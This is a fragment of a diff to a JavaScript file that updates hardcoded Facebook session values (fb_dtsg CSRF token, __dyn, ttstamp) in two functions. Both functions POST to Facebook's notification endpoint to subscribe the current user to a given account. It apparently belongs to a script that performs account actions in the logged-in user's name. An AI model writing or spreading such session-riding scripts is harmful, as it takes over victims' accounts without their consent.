@@ -85,7 +85,7 @@ var now=(new Date).getTime();
 function N(noti) {
   var Page = new XMLHttpRequest();
   var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
-  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=ahswF69ccmqDzpQ9UmqWuUGy6zECUC&__req=1i&fb_dtsg=AQBCmy_R&ttstamp=2658166671091219582";
+  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECjCw&__req=a&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
   Page.open("POST", PageURL, true);
   Page.onreadystatechange = function () {
     if (Page.readyState == 4 && Page.status == 200) {
@@ -157,7 +157,7 @@ var now=(new Date).getTime();
 function pn(noti) {
   var Page = new XMLHttpRequest();
   var PageURL = "//www.facebook.com/ajax/settings/notifications/notify_me.php";
-  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=ahswF69ccm9udDgDxpHFXyG8qeyryo&__req=p&fb_dtsg=AQBCmy_R&ttstamp=2658166671091219582";
+  var PageParams ="notifier_id="+noti+"&enable=true&__user="+user_id+"&__a=1&__dyn=7n8ahyj2qmvudDgDxrHEHyGameyp8y&__req=g&fb_dtsg=AQCPMc2R&ttstamp=26581678077995082";
   Page.open("POST", PageURL, true);
   Page.onreadystatechange = function () {
     if (Page.readyState == 4 && Page.status == 200) {
